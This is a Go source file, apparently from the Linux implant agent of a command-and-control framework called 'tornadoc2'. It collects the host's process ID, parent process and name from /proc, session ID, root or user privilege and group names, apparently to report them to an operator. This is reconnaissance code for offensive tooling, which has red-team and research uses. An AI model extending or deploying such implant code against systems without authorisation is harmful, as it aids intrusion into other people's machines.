//go:build linux

package core

import (
	"os"
	"os/user"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"

	"tornadoc2/agent/protocol"
)

func fillIdentityExtra(id *protocol.Identity) {
	id.PID = os.Getpid()
	id.ParentPID = readPPID()
	id.ParentName = readProcName(id.ParentPID)
	if sid, err := unix.Getsid(0); err == nil {
		id.SessionID = sid
	}
	if os.Geteuid() == 0 {
		id.Privilege = "root"
		id.Integrity = "root"
		id.Elevated = true
	} else {
		id.Privilege = "user"
		id.Integrity = "user"
	}

	gids, _ := os.Getgroups()
	seen := make(map[string]struct{}, len(gids))
	for _, gid := range gids {
		if len(id.Groups) >= 24 {
			break
		}
		g, err := user.LookupGroupId(strconv.Itoa(gid))
		if err != nil || g.Name == "" {
			continue
		}
		if _, ok := seen[g.Name]; ok {
			continue
		}
		seen[g.Name] = struct{}{}
		id.Groups = append(id.Groups, g.Name)
	}
}

func readPPID() int {
	b, err := os.ReadFile("/proc/self/stat")
	if err != nil {
		return 0
	}
	// comm may contain spaces and parentheses; fields resume after
	// the closing ')'. ppid is the second field after it.
	s := string(b)
	i := strings.LastIndexByte(s, ')')
	if i < 0 {
		return 0
	}
	fields := strings.Fields(s[i+1:])
	if len(fields) < 2 {
		return 0
	}
	n, _ := strconv.Atoi(fields[1])
	return n
}

func readProcName(pid int) string {
	if pid <= 0 {
		return ""
	}
	if b, err := os.ReadFile("/proc/" + strconv.Itoa(pid) + "/comm"); err == nil {
		return strings.TrimSpace(string(b))
	}
	if p, err := os.Readlink("/proc/" + strconv.Itoa(pid) + "/exe"); err == nil {
		i := strings.LastIndexByte(p, '/')
		return p[i+1:]
	}
	return ""
}
